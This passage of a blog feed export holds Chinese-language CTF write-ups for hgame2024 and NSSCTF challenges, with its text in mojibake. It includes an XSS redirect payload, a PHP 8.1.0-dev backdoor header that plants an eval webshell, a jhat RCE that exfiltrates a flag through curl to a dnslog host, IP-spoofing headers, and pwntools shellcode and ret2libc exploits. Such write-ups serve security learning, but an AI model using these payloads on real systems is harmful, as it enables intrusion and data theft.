src="/./hgame2024_week2/m_4_2.png"></p><p><code>deepsound</code>è§£å¯†éŸ³é¢‘ï¼Œå¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œå‹ç¼©åŒ…é‡Œæ˜¯ä¸€ä¸ªgifå›¾ç‰‡ã€‚</p><p>è§‚å¯Ÿgifï¼Œå¯ä»¥çœ‹åˆ°ä¸€é—ªè€Œè¿‡çš„äºŒç»´ç ï¼Œç”¨ <a href="https://uutool.cn/gif2img/">åœ¨çº¿ç½‘ç«™</a> æå–å‡ºæ‰€æœ‰çš„å¸§æ•°ã€‚</p><p>æœ€åå‘ç°æœ‰4å¼ å›¾ç‰‡æœ‰äºŒç»´ç çš„ä¸€éƒ¨åˆ†ï¼Œæå–å‡ºæ¥ã€‚</p><p><img src="/./hgame2024_week2/m_4_3.png"></p><p>æŠŠäºŒç»´ç æ‹¼å¥½ã€‚</p><p><img src="/./hgame2024_week2/m_4_4.png"></p><p>ç”¨ <a href="https://merri.cx/qrazybox/">qrazybox</a> è§£æäºŒç»´ç </p><p>ä¹‹åä¿®æ”¹<code>Format Info Pattern</code>ï¼Œ<code>Error Correction Level</code> ä¸º <code>L</code>ï¼Œ <code>Mask Pattern</code> ä¸º<code>4</code>ï¼Œå³å¯å¾—åˆ°flagã€‚</p><p><img src="/./hgame2024_week2/m_4_5.png"></p><p><img src="/./hgame2024_week2/m_4_6.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;drag0n_1s_d4nc1ng&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> MISC </tag>
            
            <tag> CRYPTO </tag>
            
            <tag> PWN </tag>
            
            <tag> hgame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF Round#18 Basic WP</title>
      <link href="/NSSCTF_Round18_Basic/"/>
      <url>/NSSCTF_Round18_Basic/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="é—¨é…±æƒ³ç©ä»€ä¹ˆå‘¢ï¼Ÿ"><a href="#é—¨é…±æƒ³ç©ä»€ä¹ˆå‘¢ï¼Ÿ" class="headerlink" title="é—¨é…±æƒ³ç©ä»€ä¹ˆå‘¢ï¼Ÿ"></a>é—¨é…±æƒ³ç©ä»€ä¹ˆå‘¢ï¼Ÿ</h2><p>æŸ¥çœ‹æºç ï¼Œå¯ä»¥å¾—åˆ°<code>king.php</code>å’Œ<code>nssctfroundSpring.php</code>ã€‚</p><p>æŸ¥çœ‹<code>nssctfroundSpring.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//éƒ¨åˆ†å…³é”®ä»£ç </span></span><br><span class="line"><span class="variable">$contentLines</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot; &quot;</span>, <span class="variable">$comment</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https?:\/\/\S+$/&#x27;</span>, <span class="variable">$contentLines</span>[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https?:\/\/[^\/]+\/\S+\.png$/&#x27;</span>, <span class="variable">$contentLines</span>[<span class="number">0</span>], <span class="variable">$matches</span>) &amp;&amp; <span class="title function_ invoke__">end</span>(<span class="variable">$contentLines</span>) === <span class="string">&#x27;/png&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$urlParts</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$matches</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$urlParts</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img class=&quot;content&quot; src=&quot;&#x27;</span> . <span class="variable">$matches</span>[<span class="number">0</span>] . <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="comment">//.......</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//......</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è®¿é—®<code>king.php</code>ï¼Œç‚¹å‡»è¯„è®ºåŒºã€‚</p><p><img src="/./NSSCTF_Round18_Basic/w_1_1.png"></p><p>é€šè¿‡è¿™é‡Œï¼Œå¯ä»¥çŒœæµ‹åˆ°<code>nssctfroundSpring.php</code>é‡Œç»™çš„æºç æ˜¯å…³äºè¯„è®ºå‘å¸ƒçš„ï¼Œç»è¿‡ä¸€äº›æµ‹è¯•ï¼Œå¯ä»¥ç¡®å®šæ’å…¥å›¾ç‰‡çš„urlå¯¹åº” <code>$matches[0]</code>ï¼Œå¯ä»¥xssã€‚</p><p>æœ¬åœ°æµ‹è¯•ä¸€ä¸‹</p><p><img src="/./NSSCTF_Round18_Basic/w_1_2.png"></p><p>æˆåŠŸå¼¹çª—ã€‚</p><p>è§‚å¯Ÿurl</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://node1.anna.nssctf.cn:28494/words/?title=MTIzMTIz&amp;content=aHR0cCUzQSUyRiUyRnh4eC54eHgueHh4JTJGJTIyJTNFJTNDc2NyaXB0JTNFYWxlcnQoJTJGeHNzJTJGKSUzQyUyRnNjcmlwdCUzRSUyMy5wbmclMjAlMkZwbmc%3D</span><br></pre></td></tr></table></figure><p>æŠŠ<code>content</code>éƒ¨åˆ†base64è§£ç ä¸€æ¬¡å†urlè§£ç ä¸€æ¬¡ï¼Œå¯ä»¥å¾—åˆ°åˆšåˆšè¾“å…¥çš„å›¾ç‰‡è¯„è®ºã€‚</p><p>æ„é€ ä¸€ä¸ªè®¿é—® å…ƒæ¢¦ä¹‹æ˜Ÿ å®˜ç½‘çš„xssã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxx.xxx.xxx/&quot;&gt;&lt;script&gt;document.location=&quot;https://ymzx.qq.com/&quot;&lt;/script&gt;#.png /png</span><br></pre></td></tr></table></figure><p><img src="/./NSSCTF_Round18_Basic/w_1_3.png"></p><p>æœ¬åœ°æˆåŠŸè·³è½¬åˆ° å…ƒæ¢¦ä¹‹æ˜Ÿã€‚</p><p>æŠŠè¿™ä¸ªé“¾æ¥ç»™é—¨é…±å°±è¡Œäº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://node1.anna.nssctf.cn:28494/words/?title=MTIzMTIz&amp;content=aHR0cCUzQSUyRiUyRnh4eC54eHgueHh4JTJGJTIyJTNFJTNDc2NyaXB0JTNFZG9jdW1lbnQubG9jYXRpb24lM0QlMjJodHRwcyUzQSUyRiUyRnltengucXEuY29tJTJGJTIyJTNDJTJGc2NyaXB0JTNFJTIzLnBuZyUyMCUyRnBuZw==</span><br></pre></td></tr></table></figure><p><img src="/./NSSCTF_Round18_Basic/w_1_4.png"></p><h2 id="Becomeroot"><a href="#Becomeroot" class="headerlink" title="Becomeroot"></a>Becomeroot</h2><p>é¦–é¡µå¯ä»¥çŸ¥é“<code>PHP Version 8.1.0-dev</code></p><p>è¿™ä¸ªç‰ˆæœ¬çš„phpå¯ä»¥rceï¼Œå‚è€ƒé“¾æ¥ï¼š<a href="https://cloud.tencent.com/developer/article/1839234">PHP 8.1.0-dev åé—¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°</a></p><p>ç”¨echoå†™é©¬æ–¹ä¾¿æ¥ä¸‹æ¥æ“ä½œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># header</span><br><span class="line">User-Agentt: zerodiumsystem(&quot;echo &#x27;&lt;?php eval(\$_POST[1])?&gt;&#x27;&gt;/var/www/html/1.php&quot;);</span><br></pre></td></tr></table></figure><p>èšå‰‘é“¾æ¥</p><p><img src="/./NSSCTF_Round18_Basic/w_2_1.png"></p><p>æ¥ä¸‹æ¥æ˜¯ææƒï¼Œè„šæœ¬è¦å»githubæ‰¾éäº¤äº’å¼çš„POC</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://github.com/Rvn0xsy/CVE-2021-3156-plus">CVE-2021-3156-plus</a></p><p>æŠŠè„šæœ¬ä¸‹è½½ä¸‹æ¥ï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨å¹¶makeï¼Œå³å¯æ‰§è¡Œå‘½ä»¤</p><p><img src="/./NSSCTF_Round18_Basic/w_2_2.png"></p><p>è¯»<code>/root/fl0g000</code>å³å¯å¾—åˆ°flagã€‚</p><p><img src="/./NSSCTF_Round18_Basic/w_2_3.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> NSSCTF Round </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame2024_week1 WP</title>
      <link href="/hgame2024_week1/"/>
      <url>/hgame2024_week1/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="2048-16"><a href="#2048-16" class="headerlink" title="2048*16"></a>2048*16</h2><p>è¿™é“é¢˜æ˜¯çŒœçš„ï¼Œæ²¡æœ‰æŠŠjsä»£ç çœ‹æ˜ç™½</p><p>jsä»£ç æœ<code>won</code>ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œ</p><p><img src="/./hgame2024_week1/w_1_1.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">V+g5LpoEej/fy0nPNivz9SswHIhGaDOmU8CuXb72dB1xYMrZFRAl=QcTq6JkWK4t3</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦æ˜¯65ï¼Œä¸”æ²¡æœ‰é‡å¤çš„å­—ç¬¦ï¼Œè¿™é‡Œæˆ‘çŒœä¸€æ‰‹æ˜¯base64ç è¡¨ã€‚</p><p>æ ¹æ®è¿™ä¸ªç è¡¨ï¼Œä»flagå¤´æ‰¾flagã€‚</p><p>å…ˆæ˜¯ç”¨<code>hgame</code>å¤´æ¥æ‰¾ï¼Œå–å‡º<code>hga</code>ç”¨å˜è¡¨çš„base64åŠ å¯†å¾—åˆ°<code>hoD8</code>ï¼Œç„¶åå…¨å±€æœï¼Œå‘ç°æ²¡æœ‰ã€‚</p><p>æ¥ç€å°è¯•<code>flag</code>å¤´ï¼Œç”¨<code>fla</code>è¿›è¡Œbase64åŠ å¯†å¾—åˆ°<code>I7R8</code>ï¼Œå…¨å±€æœå¾—åˆ°ä»¥ä¸‹ç»“æœ</p><p><img src="/./hgame2024_week1/w_1_2.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I7R8ITMCnzbCn5eFIC=6yliXfzN=I5NMnz0XIC==yzycysi70ci7y7iK</span><br></pre></td></tr></table></figure><p>æŠŠè¿™ä¸²å­—ç¬¦ä¸²ç”¨å˜è¡¨çš„base64è§£ç ï¼Œå³å¯å¾—åˆ°flag</p><p><img src="/./hgame2024_week1/w_1_3.png"></p><h2 id="Bypass-it"><a href="#Bypass-it" class="headerlink" title="Bypass it"></a>Bypass it</h2><p>è¿™é“é¢˜æ³¨å†Œä¸€ä¸ªè´¦å·ç™»å½•æˆåŠŸå³å¯ã€‚</p><p>è¿›å…¥é¢˜ç›®æ¥åˆ°<code>login.html</code>ï¼Œå…ˆç¦ç”¨jsï¼Œç‚¹å‡»æ³¨å†Œï¼Œæ¥åˆ°<code>register_page.php</code>é¡µé¢ã€‚</p><p>ä¹‹åæ‰“å¼€jsï¼Œéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ã€‚</p><p><img src="/./hgame2024_week1/w_2_1.png"></p><p>ç”¨åˆšåˆšæ³¨å†Œçš„è´¦å·ç™»å½•æˆåŠŸåï¼Œç‚¹å‡»<code>[~Click here~]</code>å³å¯å¾—åˆ°flagã€‚</p><p><img src="/./hgame2024_week1/w_2_2.png"></p><h2 id="jhat"><a href="#jhat" class="headerlink" title="jhat"></a>jhat</h2><p>å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://chenxuuu.github.io/wooyun_articles/drops/OQL(%E5%AF%B9%E8%B1%A1%E6%9F%A5%E8%AF%A2%E8%AF%AD%E8%A8%80)%E5%9C%A8%E4%BA%A7%E5%93%81%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%80%A0%E6%88%90%E7%9A%84RCE(Object%20Injection).html">OQL(å¯¹è±¡æŸ¥è¯¢è¯­è¨€)åœ¨äº§å“å®ç°ä¸­é€ æˆçš„RCE(Object Injection)</a></p><p>åœ¨<code>[Execute Object Query Language (OQL) query]</code>å¯ä»¥ç›´æ¥æ‰§è¡Œjavaä»£ç ï¼Œé€šè¿‡dnslogå¤–å¸¦å³å¯å¾—åˆ°flagã€‚</p><p><img src="/./hgame2024_week1/w_3_1.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.lang.Runtime.getRuntime().exec(&quot;bashKKK-cKKK&#123;echo,Y3VybCBgY2F0IC9mbGFnYC5kZjE1YXUuZG5zbG9nLmNu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;.split(&quot;KKK&quot;))</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆ©ç”¨<code>split</code>å°†å­—ç¬¦ä¸²å˜æˆå­—ç¬¦æ•°ç»„ï¼Œ<code>echo</code>åè¾¹çš„base64ç¼–ç é‡Œçš„å†…å®¹æ˜¯æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œè¿™é‡Œæˆ‘æ‰§è¡Œäº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl `cat /flag`.df15au.dnslog.cn</span><br></pre></td></tr></table></figure><p>ä¹‹ååœ¨<code>dnslog</code>å¯ä»¥æŸ¥çœ‹åˆ°flagã€‚</p><p><img src="/./hgame2024_week1/w_3_2.png"></p><p>è¡¥ä¸ŠèŠ±æ‹¬å·å³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;a90f6f3fde61e38f2c21b82de9c04e5702f1eaad&#125;</span><br></pre></td></tr></table></figure><h2 id="ezHTTP"><a href="#ezHTTP" class="headerlink" title="ezHTTP"></a>ezHTTP</h2><p>è€ƒå¯Ÿçš„æ˜¯httpå¤´ï¼ŒæŒ‰ç…§è¦æ±‚æ·»åŠ å¯¹åº”çš„httpå¤´å³å¯ã€‚</p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¼ªé€ æœ¬åœ°å¹¶ä¸æ˜¯åªæœ‰<code>X-Forwarded-For</code>ï¼Œä¸‹é¢è¿™äº›éƒ½å¯ä»¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line">X-Forwarded:127.0.0.1</span><br><span class="line">Forwarded-For:127.0.0.1</span><br><span class="line">Forwarded:127.0.0.1</span><br><span class="line">X-Forwarded-Host:127.0.0.1</span><br><span class="line">X-remote-IP:127.0.0.1</span><br><span class="line">X-remote-addr:127.0.0.1</span><br><span class="line">True-Client-IP:127.0.0.1</span><br><span class="line">X-Client-IP:127.0.0.1</span><br><span class="line">Client-IP:127.0.0.1</span><br><span class="line">X-Real-IP:127.0.0.1</span><br><span class="line">Ali-CDN-Real-IP:127.0.0.1</span><br><span class="line">Cdn-Src-Ip:127.0.0.1</span><br><span class="line">Cdn-Real-Ip:127.0.0.1</span><br><span class="line">CF-Connecting-IP:127.0.0.1</span><br><span class="line">X-Cluster-Client-IP:127.0.0.1</span><br><span class="line">WL-Proxy-Client-IP:127.0.0.1</span><br><span class="line">Proxy-Client-IP:127.0.0.1</span><br><span class="line">Fastly-Client-Ip:127.0.0.1</span><br><span class="line">True-Client-Ip:127.0.0.1</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé¢˜å°±ç”¨äº†<code>X-Real-IP</code>æ¥ä¼ªé€ æœ¬åœ°ã€‚</p><p><img src="/./hgame2024_week1/w_4_1.png"></p><p>æœ€ååœ¨è¿”å›çš„å¤´ä¸­å¾—åˆ°ä¸€ä¸²<code>jwt</code>ï¼Œç”¨ <a href="https://jwt.io/">jwt.io</a> è§£ç å³å¯å¾—åˆ°flagã€‚</p><p><img src="/./hgame2024_week1/w_4_2.png"></p><h2 id="Select-Courses"><a href="#Select-Courses" class="headerlink" title="Select Courses"></a>Select Courses</h2><p>è«åå¥‡å¦™å°±å‡ºäº†ï¼Œå¾ˆæ€ªã€‚</p><p>æŠ“åŒ…ï¼ŒæŠ“ä¸€ä¸ªé€‰è¯¾çš„åŒ…ï¼Œç„¶åå»çˆ†ç ´é‡å¤å‘ï¼Œç­‰ç­‰å°±æœ‰flagäº†ã€‚</p><p><img src="/./hgame2024_week1/w_5_1.png"></p><p>çˆ†ç ´è®¾ç½®é€‰æ‹©æ•°å€¼ï¼Œçˆ†ç ´ä½ç½®é€‰æ‹©<code>User-Agent</code>çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚</p><p><img src="/./hgame2024_week1/w_5_2.png"></p><p><code>id</code>ä»<code>1-5</code>éƒ½å‘ä¸€æ¬¡ï¼Œçˆ†ç ´ç»“æŸåè®¿é—®<code>/api/ok</code>å°±èƒ½å¾—åˆ°flagäº†ã€‚</p><p><img src="/./hgame2024_week1/w_5_3.png"></p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="EzSignIn"><a href="#EzSignIn" class="headerlink" title="EzSignIn"></a>EzSignIn</h2><p>ncå³å¯å¾—åˆ°flagã€‚</p><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>å…ˆidaåˆ†æ</p><p><img src="/./hgame2024_week1/p_2_1.png"></p><p>è¿™é‡Œè¦æ±‚è¾“å…¥çš„æ•°å­—è¦å°äº10ï¼Œæ³¨æ„ä»¥ä¸‹è¿™é‡Œçš„<code>v4</code>æ˜¯æœ‰ç¬¦å·çš„intã€‚</p><p>æŸ¥çœ‹<code>myread</code>å‡½æ•°</p><p><img src="/./hgame2024_week1/p_2_2.png"></p><p>æ³¨æ„ä»¥ä¸‹å½¢å‚çš„<code>a2</code>æ˜¯æ— ç¬¦å·çš„intï¼Œä¹Ÿå°±æ˜¯ä¼ è¿›æ¥çš„<code>v4</code>ä¼šè½¬æˆæ— ç¬¦å·çš„<code>a1</code>ï¼Œå› æ­¤åœ¨è¿™é‡Œ<code>v4</code>ä¼ å…¥ä¸€ä¸ªè´Ÿæ•°ç»•è¿‡ä¸»å‡½æ•°çš„åˆ¤æ–­ã€‚</p><p>æ¥ç€æ˜¯å¯¹shellcodeçš„æ£€æŸ¥è¦æ±‚æ˜¯å­—æ¯+æ•°å­—ï¼Œå»ç½‘ä¸ŠæŠ„ä¸€æ¡å°±è¡Œäº†ã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/mcmuyanga/article/details/114828207">[BUUCTF]PWNâ€”â€”mrctf2020_shellcode_revengeï¼ˆå¯è§å­—ç¬¦shellcodeï¼‰</a></p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">p=remote(<span class="string">&quot;47.100.137.175&quot;</span>,<span class="number">31592</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;input the length of your shellcode:&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;input your shellcode:&quot;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week1/p_2_3.png"></p><h2 id="Elden-Random-Challenge"><a href="#Elden-Random-Challenge" class="headerlink" title="Elden Random Challenge"></a>Elden Random Challenge</h2><p>idaåˆ†æ</p><p><img src="/./hgame2024_week1/p_3_1.png"></p><p><code>seed</code>å–çš„æ˜¯å½“å‰æ—¶é—´ï¼Œä¹‹åæ˜¯99æ¬¡çš„éšæœºæ•°åˆ¤æ–­ï¼Œç„¶åå°±æ˜¯<code>myread</code>å‡½æ•°ã€‚</p><p><img src="/./hgame2024_week1/p_3_2.png"></p><p><code>myread</code>å‡½æ•°å­˜åœ¨æ ˆæº¢å‡ºï¼Œæ²¡æœ‰åé—¨ï¼Œç”¨libcæ‰“ã€‚</p><p>å…ˆèµ°åˆ°<code>myread</code>ï¼Œç¬¬ä¸€æ¬¡æº¢å‡ºæ³„éœ²å‡º<code>puts</code>çš„åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;47.100.137.175&#x27;</span>, <span class="number">32019</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401423</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">myread = <span class="number">0x40125D</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name = <span class="string">b&#x27;a&#x27;</span>*<span class="number">13</span></span><br><span class="line">libc.srand(<span class="built_in">int</span>(time.time()))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;thy name.\n&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">    v6 = (libc.rand() % <span class="number">100</span>) + <span class="number">1</span></span><br><span class="line">    p.sendafter(<span class="string">b&#x27;the number:\n&#x27;</span>,p32(v6))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ³„éœ²åœ°å€</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">48</span>+<span class="number">8</span>)+p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(myread)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;thy brilliant mind.\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_addr = p.recv(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span>,puts_addr)</span><br><span class="line">puts_addr = puts_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">2</span>,puts_addr)</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="number">3</span>,puts_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">4</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x7f2160359420</span></span><br></pre></td></tr></table></figure><p>æ³„éœ²å‡º<code>puts</code>çš„åœ°å€å3ä½ä¸º<code>420</code>ã€‚</p><p>é€šè¿‡ <a href="https://libc.blukat.me/">libc database search</a> æŸ¥æ‰¾<code>puts</code>ã€  <code>system</code> å’Œ <code>/bin/sh</code> çš„åœ°å€ã€‚</p><p><img src="/./hgame2024_week1/p_3_3.png"></p><p>æ ¹æ®<code>puts</code>çš„åœ°å€ç®—å‡º<code>libc</code>çš„åŸºåœ°å€ï¼Œåœ¨ç¬¬äºŒæ¬¡æ ˆæº¢å‡ºæ—¶<code>getshell</code>ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;47.100.137.175&#x27;</span>, <span class="number">30915</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401423</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main_addr = <span class="number">0x40125D</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name = <span class="string">b&#x27;a&#x27;</span>*<span class="number">13</span></span><br><span class="line">libc.srand(<span class="built_in">int</span>(time.time()))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;thy name.\n&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">    v6 = (libc.rand() % <span class="number">100</span>) + <span class="number">1</span></span><br><span class="line">    p.sendafter(<span class="string">b&#x27;the number:\n&#x27;</span>,p32(v6))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">48</span>+<span class="number">8</span>)+p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"><span class="comment"># æ³„éœ²åœ°å€</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;thy brilliant mind.\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(0,p.recvline())  #p.recvuntil(&#x27;\x0a&#x27;)</span></span><br><span class="line">puts_addr = p.recv(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span>,puts_addr)</span><br><span class="line">puts_addr = puts_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">2</span>,puts_addr)</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line"><span class="comment">#puts_addr = u64(p.recv(6).ljust(8, b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">3</span>,puts_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">4</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">sys_offset = <span class="number">0x052290</span></span><br><span class="line">puts_offset = <span class="number">0x084420</span></span><br><span class="line">sh_offset = <span class="number">0x1b45bd</span></span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line">binsh = libc_base + sh_offset</span><br><span class="line">system = libc_base + sys_offset</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">48</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week1/p_3_4.png"></p><h2 id="ezfmt-string"><a href="#ezfmt-string" class="headerlink" title="ezfmt string"></a>ezfmt string</h2><p>åªæœ‰ä¸€æ¬¡çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²</p><p><img src="/./hgame2024_week1/p_4_1.png"></p><p><code>vuln</code>å‡½æ•°å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå­˜åœ¨åé—¨å‡½æ•°ã€‚</p><p>æ 